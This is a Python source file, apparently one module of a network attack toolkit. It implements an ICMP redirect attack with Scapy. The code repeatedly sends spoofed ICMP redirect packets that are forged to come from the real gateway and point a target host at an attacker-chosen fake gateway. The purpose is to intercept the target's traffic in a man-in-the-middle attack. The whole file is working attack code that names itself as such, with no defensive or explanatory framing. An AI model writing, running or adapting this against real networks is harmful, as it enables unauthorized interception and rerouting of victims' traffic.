from scapy.all import *
import threading
import time
import logging
from utils import print_status
import config

class ICMPRedirector:
    def __init__(self, target_ip, real_gw, fake_gw, interface=config.INTERFACE):
        self.target_ip = target_ip
        self.real_gw = real_gw
        self.fake_gw = fake_gw
        self.interface = interface
        self.running = False
        self.thread = None
        
        # Get MAC addresses
        self.target_mac = getmacbyip(target_ip)
        if not self.target_mac:
            raise ValueError(f"Could not resolve MAC address for {target_ip}")

    def start(self):
        """Start ICMP redirect attack."""
        if self.running:
            print_status("Attack already running", "warning")
            return False

        self.running = True
        self.thread = threading.Thread(target=self._redirect)
        self.thread.daemon = True
        self.thread.start()
        print_status(f"Started ICMP redirect attack on {self.target_ip}", "success")
        return True

    def stop(self):
        """Stop ICMP redirect attack."""
        if not self.running:
            return False

        self.running = False
        if self.thread:
            self.thread.join()
        print_status("Stopped ICMP redirect attack", "success")

    def _redirect(self):
        """Main redirect loop."""
        while self.running:
            try:
                # Create ICMP redirect packet
                ether = Ether(dst=self.target_mac)
                ip = IP(src=self.real_gw, dst=self.target_ip)
                icmp = ICMP(type=5, code=1, gw=self.fake_gw)
                
                # Original packet that triggered the redirect
                original_ip = IP(src=self.target_ip, dst="8.8.8.8")
                original_icmp = ICMP()
                
                # Send the redirect packet
                sendp(ether / ip / icmp / original_ip / original_icmp, 
                      verbose=0, iface=self.interface)
                
                time.sleep(config.ICMP_REDIRECT_INTERVAL)
            except Exception as e:
                print_status(f"Error in ICMP redirect: {e}", "error")
                logging.error(f"Error in ICMP redirect: {e}")
                self.running = False
                break

def run_attack(target_ip, real_gw, fake_gw):
    """Run ICMP redirect attack with proper cleanup."""
    try:
        redirector = ICMPRedirector(target_ip, real_gw, fake_gw)
        redirector.start()
        
        # Keep the main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print_status("\nStopping attack...", "warning")
            redirector.stop()
            
    except Exception as e:
        print_status(f"Error: {e}", "error")
        logging.error(f"Error in ICMP redirect attack: {e}")
        return False
    
    return True 